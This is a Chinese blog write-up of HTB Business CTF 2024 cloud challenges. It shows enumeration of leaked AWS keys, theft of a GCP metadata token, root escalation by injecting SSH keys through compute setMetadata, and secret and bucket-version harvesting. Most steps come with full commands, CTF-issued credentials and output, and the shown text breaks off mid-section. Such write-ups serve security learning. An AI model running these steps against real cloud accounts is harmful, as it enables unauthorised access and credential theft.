---

tags: Cloud Native Security News, aws, gcp, htb
version: v0.1.0

---

# 云原生安全资讯: Cloud | HTB Business CTF 2024 WriteUp

赛事链接：[https://www.hackthebox.com/events/htb-business-ctf-2024](https://www.hackthebox.com/events/htb-business-ctf-2024)

❤️ 题目由 **super cool cloud hacker** [eson师傅](https://twitter.com/Skyworship2) 友情“赞助”，期间还请教了一些问题，感谢🙏。通过 After Party 环境复现，收获满满 😁

## 0x01 Scurried

> We have obtained leaked data pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to analyze and extract pertinent information from the provided data. The flag is the ARN wrapped in HTB{} .
> 

[cloud_scurried.zip](image/2024-05-28/cloud_scurried.zip)

附件 txt 文件有一串 `AROAXYAFLIG2BLQFIIP34` ，题目描述需要提交用 HTB{} 包裹的 `ARN` （Amazon Resource Name）

搜了下文档翻到 [https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_identifiers.html#identifiers-unique-ids](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_identifiers.html#identifiers-unique-ids) 发现该字符串以 `AROA` 开头是角色 ID 前缀，该串就是角色唯一标识符了，然后还写道

> 大多数情况下，在使用 IAM 资源时，您使用易于识别的名称和 [ARN](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_identifiers.html#identifiers-arns)。这样，您就不需要知道特定资源的唯一 ID。不过有时，当实际情况不允许使用好友名称时，唯一 ID 可能非常有用。
> 

也就是让我们创建一个角色策略，创建成功后，该唯一 ID 就能对应上易于识别的 ARN。

我们登陆到 aws，然后访问 iam → 角色 → 创建角色

![Untitled](image/2024-05-28/Untitled.png)

因为要自定义角色 ID，并选择 自定义信任策略，根据上面文档的角色ID在 `Principal` 的写法

![Untitled](image/2024-05-28/Untitled%201.png)

这里有报错，不要紧，因为我们还没有这个角色引用，直接下一步即可，然后不用选一直下一步，给策略随便写个名字，创建成功后点击我们新建的角色，然后在信任关系就能看到由角色 ID 解析出来易于识别的 ARN 了，vault101 ARN 就拿到了～

![Untitled](image/2024-05-28/Untitled%202.png)

> HTB{arn:aws:iam::532587168180:role/vault101}
> 

## 0x02 Protrude

> We have obtained leaked account pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to enumerate and see if we can infiltrate them internally.
> 

[cloud_protrude.zip](image/2024-05-28/cloud_protrude.zip)

这次附件给了 AKSK 

| Access key ID | Secret access key | region name |
| --- | --- | --- |
| AKIAXYAFLIG2JE6MC2SY | teWVv0GzIBKS23uozxUGmUH+muE5XB86fnZmRZXu | us-east-1 |

枚举下权限

```bash
> python3 enumerate-iam.py --access-key AKIAXYAFLIG2JE6MC2SY --secret-key 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

2024-05-24 20:24:44,577 - 36002 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2JE6MC2SY"
2024-05-24 20:24:47,577 - 36002 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/aalmodovar
2024-05-24 20:24:47,577 - 36002 - [INFO] -- Account Id  : 532587168180
2024-05-24 20:24:47,577 - 36002 - [INFO] -- Account Path: user/aalmodovar
2024-05-24 20:24:48,052 - 36002 - [INFO] Attempting common-service describe / list brute force.
2024-05-24 20:24:54,994 - 36002 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-24 20:25:00,070 - 36002 - [INFO] -- sts.get_caller_identity() worked!
2024-05-24 20:25:00,519 - 36002 - [INFO] -- sts.get_session_token() worked!
2024-05-24 20:25:06,096 - 36002 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2024-05-24 20:25:24,007 - 36002 - [INFO] -- ds.describe_directories() worked!
```

有个 `ds.describe_directories()` 搜下用法

```bash
> aws ds describe-directories

{
    "DirectoryDescriptions": [
        {
            "DirectoryId": "d-9067e0513b",
            "Name": "vault101.wasteland.local",
            "ShortName": "VAULT101",
            "Size": "Small",
            "Alias": "vault101",
            "AccessUrl": "vault101.awsapps.com",
            "DnsIpAddrs": [
                "172.31.87.164",
                "172.31.31.15"
            ],
            "Stage": "Active",
            "LaunchTime": "2024-04-29T05:47:14.630000+08:00",
            "StageLastUpdatedDateTime": "2024-04-29T05:54:13.623000+08:00",
            "Type": "SimpleAD",
            "VpcSettings": {
                "VpcId": "vpc-0d7b2c5c8509574bd",
                "SubnetIds": [
                    "subnet-0a5022ff1dfdf5518",
                    "subnet-0574f58cd2d4f85ca"
                ],
                "SecurityGroupId": "sg-0bee7f241cef79345",
                "AvailabilityZones": [
                    "us-east-1a",
                    "us-east-1d"
                ]
            },
            "SsoEnabled": true,
            "DesiredNumberOfDomainControllers": 0
        }
    ]
}
```

原来是 AD 域里的一台机器，有个访问地址，访问 AccessUrl：vault101.awsapps.com

![Untitled](image/2024-05-28/Untitled%203.png)

看标题，像是 AWS 里部署的，搜了下发现是个 [WorkDocs](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/workdocs/index.html)，一个个看了下，emmm，基本都要传个 id 之类的，然后也没枚举出来这个权限，不过像这种要传入参数的，不一定能枚举出来？！

然后把 Direcroty 和 Organization 联想搜索发现，[Connect to Amazon WorkDocs with IAM user credentials and query for users - Amazon WorkDocs](https://docs.aws.amazon.com/workdocs/latest/developerguide/connect-workdocs-iam.html) ，原来 DirectoryID 就是 organization-id，于是尝试

```bash
> aws workdocs describe-activities --organization-id d-9067e0513b

{
    "UserActivities": [
        {
            "Type": "DOCUMENT_VERSION_VIEWED",
            "TimeStamp": "2024-05-19T21:15:32.835000+08:00",
            "IsIndirectActivity": false,
            "Initiator": {
                "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
            },
            "ResourceMetadata": {
                "Type": "document",
                "Name": "flag.txt",
                "Id": "5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303",
                "Owner": {
                    "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
                }
            }
        },
....
```

原来能请求，这个是最近编辑的，看一下文档内容

```bash
> aws workdocs get-document --document-id 5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303
{
    "Metadata": {
        "Id": "5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303",
        "CreatorId": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b",
        "ParentFolderId": "a640c404de3b5999c1d06cdf4eb6b7a29de60b26d1611cc8bc3757447dc49555",
        "CreatedTimestamp": "2024-05-19T00:15:36.962000+08:00",
        "ModifiedTimestamp": "2024-05-19T00:15:44.393000+08:00",
        "LatestVersionMetadata": {
            "Id": "1716048936962-62cd64e3c78ceac9b28d07615056620eb3c41ba49156b8f5979eac81eaa1f720",
            "Name": "flag.txt",
            "ContentType": "text/plain",
            "Size": 40,
            "Signature": "3a1339875f0d0486886f1f4da81171a0",
            "Status": "ACTIVE",
            "CreatedTimestamp": "2024-05-19T00:15:36.962000+08:00",
            "ModifiedTimestamp": "2024-05-19T00:15:36.962000+08:00",
            "CreatorId": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b",
            "Thumbnail": {
                "LARGE": "https://gb-prod-doc-source.s3.amazonaws.com/5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303/1716048936962-62cd64e3c78ceac9b28d07615056620eb3c41ba49156b8f5979eac81eaa1f720/PDF_LARGE?response-content-disposition=attachment%3B%20filename%2A%3DUTF-8%27%27LARGE&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBYaCXVzLWVhc3QtMSJHMEUCIDISxhuqpG9MwxarPaJNesId2tNKNeG8aZyu9dS0muFmAiEAtXUug3IBMYqBIYM1S1uG3c7KLCwifPS%2FGw3fYSjt%2BU4q3AMIjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw5NzMxODc1NTMwMjciDATjCYhitwSeEkY6niqwA6zzXsdk77SksVifeHsK6KbzJYHldrSxmz4XjNMptjM8ruQSnPIAQb84qKhsLfKb5KOHCLLsZoK5nzCZoAFyh4LWx2%2BXIHF7bN3T%2BKI36OtughGHy%2Fx7v8uMduTO9x7yk0dYQhJD5m4k6GCowG145FH00HMqzLuyXVfmVu1D%2FEBpS6VjwHz%2BS%2FsmSdR3amYjKlHh7ovFDsg5w6JzIvct3OKD7kdeLFpISNbBBfm132%2FRSO%2BvofAoZYVEjZklFqO8sXLkw0%2Fuf6zuRN5vfKSgtMmH0yG3etHv9CoEfODfAXW0uO8YS3oewZohy5%2BedJ3K2qjrihEv6tfZ2HBhRUSBOj6tVqasqvTyLSEf9Mxs3Amw6lD%2FWqTiGSxbTvkwRLhLyigOVQcZKY9ftTYZpVijNhXHTGYOvn%2FjmiJHwjhL%2FYrc6PEvBoqPyVaeaPp5899oXPDiXD%2FRiB%2FpHv%2FLgiPYt2lqOvDaqHeftfIrH9xaZwaKO0yRblTQGarrgr2m7wUga%2BqLeWy8r%2FrqYzuE9MlTnqUJm4IDU7KPjitSoGp8Xh8y09THyg0g8T9I6dB7biXL%2FzDioMKyBjqhAczJ3ZMj%2FDhlZM5xJ1G6g9%2F9MpiJ4I%2FhzGtw44a976FSSSS5QI7L4We6PkSRDcAyo1h1iIFJY92o73lwTNGFze2wyonnNHo5Cizjv9ipfhc5ifzxzkTAgYdUnJIhwvX7njQ3GLtTZVIof76ih712tHxOsyLfFomMM5cN5sUWYvcI%2BRWrkDp9n00zmdDr6QR0soCo3U6U2pqQ%2FbLzX7gRuu93&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240524T132553Z&X-Amz-SignedHeaders=host&X-Amz-Expires=900&X-Amz-Credential=ASIA6FFT7S4BRX66LOUC%2F20240524%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=2f240eaaba93904f9a36532931933e01b55faa21f09d0ebbae87f9ed489f5b21",
                "SMALL": ....
            }
        },
        "ResourceState": "ACTIVE"
    }
}
```

把附件下下来即可拿到 flag

![Untitled](image/2024-05-28/Untitled%204.png)

> HTB(AWS_WORKDOCS_CAN_HAVE_USEFUL_STUFF)
> 

## 0x03 MetaRooted

> You have obtained unprivileged access to a Linux machine that controls one of the many vault alarm systems. In order to deactivate the alarms and proceed with your quest, you must escalate your privileges to root. You may login via SSH using the provided private key.
> 
> 
> IP Address: 34.132.25.162
> 
> Username: vaultuser
> 

[cloud_metarooted.zip](image/2024-05-28/cloud_metarooted.zip)

附件提供一个 ssh 私钥，连上去即可，根据描述我们要提权到 root 用户

```bash
ssh -i id_rsa vaultuser@34.132.25.162
```

~~看到 crontab 有人定时改密码，直接 ssh 上去拿 flag~~ （bushi）

当前机器权限是低权限用户

```bash
> id
uid=1002(vaultuser) gid=1003(vaultuser) groups=1003(vaultuser)
```

确定是 gcloud

```bash
> curl --connect-timeout 2 metadata.google.internal

computeMetadata/
```

并可以直接请求元数据获取服务账号 token

```bash
> curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json

{"access_token":"ya29.c.c0AY_VpZi7ff7XynqSqk42X8cltVlBcDoXucLfgv6sohsHSMYJOmPWXN6Cmhe-bjBeFC9v2iAs2iq-WajjMRUZ7PMFFoKW67SmO5Lwu-nARCYbwrC9mJIOyLUJz9cNdzbWwvgMAXEA78ynwBj-ZeaxjvR3qmohw8QqVMY-6yfMfzKIkNQVC0XSpqJpyRKxJPJmS2_8gHPcOD-y87KHQk08SOd5RygZiOKLAXmVWp9_Z12GSQxYugjTvXKaHxpGvDo5GxV26s92xrTPyeX_29dkPlicv8QjQGZK274D5HhO8swLsmTBRMYrKoXA7wKItRIS5I2lmjFgsQhiqn7s7VirFbLOosD_UpzuhjpLKYzWi1O2CVm9TYCCCV114KaKqfA7K6c2G397C6tgnbB312uagaBta7RciOpInI24U-aVl0YVib5felX-X_Y_Y5umszgbI9pFnhU_zQumBQ79vu_-ni2mnwmedRjV2j2d9RpmSW-MqXZ71yRi_sJ6de_gj2wr1BZF1IVenRdmg6zZ5_jjs87fqs2rRQZzsFan7Msc2JUSyX-QellJ7O1clJ6ca0IbMx9UM49V-uyV8-Of3cfBIjY4tikqbSb3gcioykfk8Sf9hW00Wt3wvX0d578W8i3deVq_uxkSw_ucSa8326um2uwW4y5cwJqFJZUi8t530c4ZSeXkI3c3qF7-YfdVcvybQJYmW_UM08i22orc7sYYy4ewuzIkuw_BI-BJ4BuzV1oulW_WoZSqxy-rnfxsf8-stYqYIUJOuZ4nBRWQVf3QUQoIkbju67XagY1mXugM0vVjyqqbFQQR_vRUV71aOW4McQnwdyIy4uJo3Rng8VsM4oSWgwfIhJfbB8Jvn8Yo_uSh8pZ5Vl6Qffre3g-erU-j6UyUmFd-OcWuswzUtij_im0M3FxX61jMzdSS1Op3BBW3lO9c9905Jx3wOMvlcdvwW9ukh8SurIWvQulx6tvhek5hdgxJjZ3xUZjdyclY2i-ufFWbu5q_w0w","expires_in":2087,"token_type":"Bearer"}
```

其实根据题目名称很明显让我们根据 metadata 去提权，[Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments (gitlab.com)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#modifying-the-metadata)，gitlab 博客文章写了关于修改 metadata 的利用条件

1. 使用默认服务账号，并 access scopes 为二者之一
    - Allow full access to all Cloud APIs
    - Set access for each API 然后允许访问 compute API
2. 使用自定义服务账号，IAM 权限设置为
    - compute.instances.setMetadata （影响单个实例）
    - compute.projects.setCommonInstanceMetadata（影响租户的所有实例）

并且自定义服务账号 access scopes 为下面二者之一就可以利用

- https://www.googleapis.com/auth/compute
- https://www.googleapis.com/auth/cloud-platform

查看服务账号，是存在自定义服务账号的，所以要看自定义服务账号的权限

```bash
> curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

default/
vault-27@ctfs-417807.iam.gserviceaccount.com/
```

[https://cloud.google.com/iam/docs/service-account-types?hl=zh-cn#user-managed](https://cloud.google.com/iam/docs/service-account-types?hl=zh-cn#user-managed)

根据文档，@ 前面为服务账号名，.iam 前面为 project-id 即租户id

谷歌云计算实例一般自带 gcloud，我们看一下这个服务账号的 iam 策略，

```bash
> gcloud projects get-iam-policy ctfs-417807

# 不过权限不足
ERROR: (gcloud.projects.get-iam-policy) User [vault-27@ctfs-417807.iam.gserviceaccount.com] does not have permission to access projects instance [ctfs-417807:getIamPolicy] (or it may not exist): The caller does not have permission
```

这里遇到一个小坑，就是我电脑装着很多个 Python 版本，最新默认的是 Python3.12，但 gcloud 不支持，需要通过环境变量指定 python 低版本可执行路径，就能正常用 gcloud 了

```bash
export CLOUDSDK_PYTHON=/usr/local/bin/python3.10
```

那就看 iam 角色

```bash
> gcloud iam roles list --project ctfs-417807
```

绑定的是 VaultManager 角色，查看角色权限

```bash
> gcloud iam roles describe VaultManager --project ctfs-417807

description: Role for the vault-27 service account (vault-instance VM)
etag: BwYXcxIEKDY=
includedPermissions:
- compute.instances.get
- compute.instances.setMetadata
- iam.roles.get
- iam.roles.list
name: projects/ctfs-417807/roles/VaultManager
stage: GA
title: Vault Manager
```

OK，有 `compute.instances.setMetadata` 权限

获取计算实例名

```bash
> curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

vault-instance
```

可以通过 setMetadata 权限，然后改元数据来在该计算 vault-instance 实例中新建用户和写入 ssh 密钥

```bash
NEWUSER="tari"
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt
gcloud compute instances add-metadata vault-instance --metadata-from-file ssh-keys=meta.txt
```

- 注意这里直接用 root 用户是写不了的
    
    ```bash
    vaultuser@vault-instance:~$ NEWUSER="root"
    vaultuser@vault-instance:~$ ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
    NEWKEY="$(cat ./key.pub)"
    echo "$NEWUSER:$NEWKEY" > ./meta.txt
    gcloud compute instances add-metadata vault-instance --metadata-from-file ssh-keys=meta.txt
    Generating public/private rsa key pair.
    Your identification has been saved in ./key
    Your public key has been saved in ./key.pub
    The key fingerprint is:
    SHA256:hoFzdhroa4nG9iGDsCcFC7Fd/YaTezg536PdXzDTAyA root
    The key's randomart image is:
    +---[RSA 3072]----+
    |.   ..   E .     |
    | + . o.   . .    |
    |+ . + =+.    .   |
    |.o . ++*o     .. |
    |o . . o*S     +..|
    |.= . o*..      +.|
    |+ O =  = .      .|
    | = = .  ..o.   . |
    |    .   .......  |
    +----[SHA256]-----+
    Did you mean zone [us-central1-a] for instance: [vault-instance] (Y/n)?
    
    Updated [https://www.googleapis.com/compute/v1/projects/ctfs-417807/zones/us-central1-a/instances/vault-instance].
    vaultuser@vault-instance:~$ ssh -i key root@127.0.0.1
    root@127.0.0.1: Permission denied (publickey).
    ```
    

该用户是有 root 组的 sudo 权限的

```bash
> ssh -i key tari@127.0.0.1

tari@vault-instance:~$ id
uid=1003(tari) gid=1004(tari) groups=1004(tari),4(adm),30(dip),44(video),46(plugdev),1000(google-sudoers)

tari@vault-instance:~$ sudo su
root@vault-instance:/home/tari# cd
root@vault-instance:~# ls
flag.txt
root@vault-instance:~# cat flag.txt
HTB{iam.root.becauseiwasgivenTooManyPrivileges}

root@vault-instance:/home/tari# cat /etc/sudoers.d/google_sudoers
%google-sudoers ALL=(ALL:ALL) NOPASSWD:ALL
```

> HTB{iam.root.becauseiwasgivenTooManyPrivileges}
> 

这里也 curl 利用方式，这种就需要自己获取 fingerprint

```bash
curl -X POST https://compute.googleapis.com/compute/v1/projects/ctfs-417807/setMetadata -H Authorization: Bearer <access_token> -H "Content-Type: application/json" --data '{"items": [{"key": "ssh-keys"}, "value": "ssh用户:ssh公钥"], "fingerprint": "<fingerprint>"}'
```

> `access_token` 从 `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json` 或 `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/vault-27@ctfs-417807.iam.gserviceaccount.com/token` 获取
> 

不过如果获取 fingerprint 走下面这个接口会有问题

```bash
curl https://compute.googleapis.com/compute/v1/projects/ctfs-417807 -H "Authorization: Bearer <access_token>"
```

会报权限不足错

```bash
Required 'compute.projects.get' permission for 'projects/ctfs-417807
```

然后 http 接口的话，不走 metadata 接口也可以这样看当前 access_token 的 scopes

```bash
curl 'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<access_token>'
```

## 0x04 CloudOfSmoke

> This carving is thought to hold the key for accessing the mythical vault in the clouds that is rumored to hold as much gold as the legendary underground vault. After a long search, you manage to find the vault at [http://34.29.127.192](http://34.29.127.192/). Can you get in?
> 

[cloud_cloudofsmoke.zip](image/2024-05-28/cloud_cloudofsmoke.zip)

F12 发现背景图 URL 是从谷歌存储里的

```bash
https://storage.googleapis.com/cloud-vault-assets/img/cloud-vault.png
```

找了下使用 service account key 的方法

[https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account](https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account)

```bash
gcloud auth activate-service-account --key-file=key.json
```

然后就能看存储里的东西了，然后把东西放到本地，方便看

```bash
> gcloud storage ls gs://cloud-vault-assets/

gs://cloud-vault-assets/cloudvault-dev-files/
gs://cloud-vault-assets/img/
```

```bash
> gcloud storage ls -r gs://cloud-vault-assets/
gs://cloud-vault-assets/:

gs://cloud-vault-assets/cloudvault-dev-files/:
gs://cloud-vault-assets/cloudvault-dev-files/
gs://cloud-vault-assets/cloudvault-dev-files/app.js
gs://cloud-vault-assets/cloudvault-dev-files/package.json

gs://cloud-vault-assets/cloudvault-dev-files/config/:
gs://cloud-vault-assets/cloudvault-dev-files/config/db.js

gs://cloud-vault-assets/img/:
gs://cloud-vault-assets/img/
gs://cloud-vault-assets/img/cloud-vault.png
```

```bash
> gcloud storage cp -r gs://cloud-vault-assets/ .

Copying gs://cloud-vault-assets/cloudvault-dev-files/app.js to file://./cloud-vault-assets/cloudvault-dev-files/app.js
Copying gs://cloud-vault-assets/cloudvault-dev-files/config/db.js to file://./cloud-vault-assets/cloudvault-dev-files/config/db.js
Copying gs://cloud-vault-assets/cloudvault-dev-files/package.json to file://./cloud-vault-assets/cloudvault-dev-files/package.json
Copying gs://cloud-vault-assets/img/cloud-vault.png to file://./cloud-vault-assets/img/cloud-vault.png
  Completed files 4/4 | 6.4MiB/6.4MiB | 1.3MiB/s

Average throughput: 974.2kiB/s
```

但发现里面的代码并不全，还有一些缺失的，不过是 dev 的存储，也能理解，那剩下的呢？

枚举一下这个服务账号的权限

![Untitled](image/2024-05-28/Untitled%205.png)

发现还有个备份的key

```bash
> gcloud secrets list --project ctfs-417807

NAME        CREATED              REPLICATION_POLICY  LOCATIONS
backup-key  2024-04-30T03:59:43  automatic           -
```

扒拉用了一下不同的命令，就发现有两个版本的 backup-key

```bash
> gcloud secrets versions list backup-key --project ctfs-417807

NAME  STATE    CREATED              DESTROYED
2     enabled  2024-04-30T04:00:17  -
1     enabled  2024-04-30T03:59:45  -

> gcloud secrets versions access 1 --secret=backup-key --project ctfs-417807

mi@u7eij3Wae4

> gcloud secrets versions access 2 --secret=backup-key --project ctfs-417807

SRe6TCDV0eo|8
```

到这里就有点卡住了，等等？上面有说到版本，桶会不会也有版本控制？！

[https://cloud.google.com/sdk/gcloud/reference/storage/ls](https://cloud.google.com/sdk/gcloud/reference/storage/ls)

还真有，通过 -a 参数可以看所有版本，比如

```bash
> gcloud storage ls -a gs://cloud-vault-assets/cloudvault-dev-files

gs://cloud-vault-assets/cloudvault-dev-files/#1714402287147351
gs://cloud-vault-assets/cloudvault-dev-files/app.js#1714402876647574
gs://cloud-vault-assets/cloudvault-dev-files/package.json#1714449491779976
gs://cloud-vault-assets/cloudvault-dev-files/config/

> gcloud storage ls -a gs://cloud-vault-assets/cloudvault-dev-files/config

gs://cloud-vault-assets/cloudvault-dev-files/config/db.js#1714402948273829
gs://cloud-vault-assets/cloudvault-dev-files/config/firestore.json#1714402948237947
```

搞到本地

```bash
> gcloud storage cp gs://cloud-vault-assets/cloudvault-dev-files/config/firestore.json#1714402948237947 ~/Downloads/cloud-vault-assets/cloudvault-dev-files/config/

Copying gs://cloud-vault-assets/cloudvault-dev-files/config/firestore.json#1714402948237947 to file:///Users/tari/Downloads/cloud-vault-assets/cloudvault-dev-files/config/firestore.json
  Completed files 1/1 | 2.3kiB/2.3kiB
```

然后这个贼多权限

- `./cliam gcp --service-account ~/Downloads/cloud-vault-assets/cloudvault-dev-files/config/firestore.json bruteforce`
    
    ```bash
    May 25 18:45:10 DBG ● project=ctfs-417807 region=us-central1 zone=us-central1-a
    May 25 18:45:12 INF ● automl.annotationSpecs=get
    May 25 18:45:12 INF ● automl.annotationSpecs=list
    May 25 18:45:12 INF ● automl.annotations=list
    May 25 18:45:12 INF ● automl.columnSpecs=get
    May 25 18:45:12 INF ● automl.columnSpecs=list
    May 25 18:45:12 INF ● automl.datasets=get
    May 25 18:45:12 INF ● automl.datasets=list
    May 25 18:45:12 INF ● automl.examples=get
    May 25 18:45:12 INF ● automl.examples=list
    May 25 18:45:12 INF ● automl.humanAnnotationTasks=get
    May 25 18:45:12 INF ● automl.humanAnnotationTasks=list
    May 25 18:45:12 INF ● automl.locations=get
    May 25 18:45:12 INF ● automl.locations=list
    May 25 18:45:12 INF ● automl.modelEvaluations=get
    May 25 18:45:12 INF ● automl.modelEvaluations=list
    May 25 18:45:12 INF ● automl.models=get
    May 25 18:45:12 INF ● automl.models=list
    May 25 18:45:12 INF ● automl.operations=get
    May 25 18:45:12 INF ● automl.operations=list
    May 25 18:45:12 INF ● automl.tableSpecs=get
    May 25 18:45:12 INF ● automl.tableSpecs=list
    May 25 18:45:13 INF ● cloudbuild.builds=get
    May 25 18:45:13 INF ● cloudbuild.builds=list
    May 25 18:45:13 INF ● cloudconfig.configs=get
    May 25 18:45:13 INF ● cloudfunctions.functions=get
    May 25 18:45:13 INF ● cloudfunctions.functions=get-iam-policy
    May 25 18:45:13 INF ● cloudfunctions.functions=list
    May 25 18:45:13 INF ● cloudfunctions.locations=list
    May 25 18:45:13 INF ● cloudfunctions.operations=get
    May 25 18:45:13 INF ● cloudfunctions.operations=list
    May 25 18:45:14 INF ● cloudnotifications.activities=list
    May 25 18:45:16 INF ● cloudtoolresults.executions=get
    May 25 18:45:16 INF ● cloudtestservice.environmentcatalog=get
    May 25 18:45:16 INF ● cloudtoolresults.executions=list
    May 25 18:45:16 INF ● cloudtoolresults.histories=get
    May 25 18:45:16 INF ● cloudtestservice.matrices=get
    May 25 18:45:16 INF ● cloudtoolresults.histories=list
    May 25 18:45:16 INF ● cloudtoolresults.settings=get
    May 25 18:45:16 INF ● cloudtoolresults.steps=get
    May 25 18:45:16 INF ● cloudtoolresults.steps=list
    May 25 18:45:19 INF ● datastore.databases=get
    May 25 18:45:19 INF ● datastore.databases=get-iam-policy
    May 25 18:45:19 INF ● datastore.databases=list
    May 25 18:45:19 INF ● datastore.entities=get
    May 25 18:45:19 INF ● datastore.entities=list
    May 25 18:45:19 INF ● datastore.indexes=get
    May 25 18:45:19 INF ● datastore.indexes=list
    May 25 18:45:19 INF ● datastore.namespaces=get
    May 25 18:45:19 INF ● datastore.namespaces=get-iam-policy
    May 25 18:45:19 INF ● datastore.namespaces=list
    May 25 18:45:19 INF ● datastore.statistics=get
    May 25 18:45:19 INF ● datastore.statistics=list
    May 25 18:45:19 INF ● errorreporting.groups=list
    May 25 18:45:20 INF ● firebase.billingPlans=get
    May 25 18:45:20 INF ● firebase.clients=get
    May 25 18:45:20 INF ● firebase.links=list
    May 25 18:45:20 INF ● firebase.projects=get
    May 25 18:45:20 INF ● firebaseabt.experimentresults=get
    May 25 18:45:20 INF ● firebaseanalytics.resources=google-analytics-read-and-analyze
    May 25 18:45:20 INF ● firebaseabt.experiments=get
    May 25 18:45:20 INF ● firebaseabt.experiments=list
    May 25 18:45:20 INF ● firebaseabt.projectmetadata=get
    May 25 18:45:20 INF ● firebasecrash.reports=get
    May 25 18:45:20 INF ● firebasecrashlytics.config=get
    May 25 18:45:20 INF ● firebasecrashlytics.data=get
    May 25 18:45:20 INF ● firebasecrashlytics.issues=get
    May 25 18:45:20 INF ● firebasecrashlytics.issues=list
    May 25 18:45:20 INF ● firebasecrashlytics.sessions=get
    May 25 18:45:21 INF ● firebaseauth.configs=get
    May 25 18:45:21 INF ● firebaseauth.users=get
    May 25 18:45:21 INF ● firebasedynamiclinks.destinations=list
    May 25 18:45:21 INF ● firebasedynamiclinks.domains=get
    May 25 18:45:21 INF ● firebasedatabase.instances=get
    May 25 18:45:21 INF ● firebasedynamiclinks.domains=list
    May 25 18:45:21 INF ● firebasedatabase.instances=list
    May 25 18:45:21 INF ● firebasehosting.sites=get
    May 25 18:45:21 INF ● firebasedynamiclinks.links=get
    May 25 18:45:21 INF ● firebasedynamiclinks.links=list
    May 25 18:45:21 INF ● firebasedynamiclinks.stats=get
    May 25 18:45:21 INF ● firebasehosting.sites=list
    May 25 18:45:21 INF ● firebaseextensions.configs=list
    May 25 18:45:21 INF ● firebaseml.compressionjobs=get
    May 25 18:45:21 INF ● firebaseml.compressionjobs=list
    May 25 18:45:21 INF ● firebaseml.models=get
    May 25 18:45:21 INF ● firebaseml.models=list
    May 25 18:45:21 INF ● firebaseml.modelversions=get
    May 25 18:45:21 INF ● firebaseml.modelversions=list
    May 25 18:45:22 INF ● firebaseinappmessaging.campaigns=get
    May 25 18:45:22 INF ● firebaseinappmessaging.campaigns=list
    May 25 18:45:22 INF ● firebaserules.releases=get
    May 25 18:45:22 INF ● firebaseperformance.data=get
    May 25 18:45:22 INF ● firebaserules.releases=list
    May 25 18:45:22 INF ● firebaserules.rulesets=get
    May 25 18:45:22 INF ● firebaserules.rulesets=list
    May 25 18:45:22 INF ● firebasenotifications.messages=get
    May 25 18:45:22 INF ● firebasenotifications.messages=list
    May 25 18:45:22 INF ● firebasepredictions.predictions=list
    May 25 18:45:23 INF ● logging.logEntries=list
    May 25 18:45:23 INF ● monitoring.timeSeries=list
    May 25 18:45:24 INF ● resourcemanager.projects=get
    May 25 18:45:24 INF ● resourcemanager.projects=get-iam-policy
    May 25 18:45:24 INF ● remotebuildexecution.blobs=get
    May 25 18:45:24 INF ● run.configurations=get
    May 25 18:45:24 INF ● run.configurations=list
    May 25 18:45:24 INF ● run.locations=list
    May 25 18:45:24 INF ● run.revisions=get
    May 25 18:45:24 INF ● run.revisions=list
    May 25 18:45:24 INF ● run.routes=get
    May 25 18:45:24 INF ● run.routes=list
    May 25 18:45:24 INF ● run.services=get
    May 25 18:45:24 INF ● run.services=get-iam-policy
    May 25 18:45:24 INF ● run.services=list
    May 25 18:45:24 INF ● serviceusage.operations=get
    May 25 18:45:24 INF ● serviceusage.operations=list
    May 25 18:45:24 INF ● serviceusage.quotas=get
    May 25 18:45:24 INF ● serviceusage.services=get
    May 25 18:45:24 INF ● serviceusage.services=list
    May 25 18:45:24 INF ● storage.buckets=list
    May 25 18:45:24 INF ● storage.objects=get
    May 25 18:45:24 INF ● storage.objects=get-iam-policy
    May 25 18:45:24 INF ● storage.objects=list
    ```
    

简述一下firebase是什么东西：对于开发侧，开发不需要自己搭建服务器、数据库，并开发健全的身份认证服务等，这些 GCP 都给开发者提供了，开发可以更专注于开发业务从而开发一个具体应用。详细看原文，  [https://cloud.webeye.com/tech-blog/su-kan-mei-you-bi-zhe-geng-quan-mian-de-firebase-jie-shao.html](https://cloud.webeye.com/tech-blog/su-kan-mei-you-bi-zhe-geng-quan-mian-de-firebase-jie-shao.html) ，

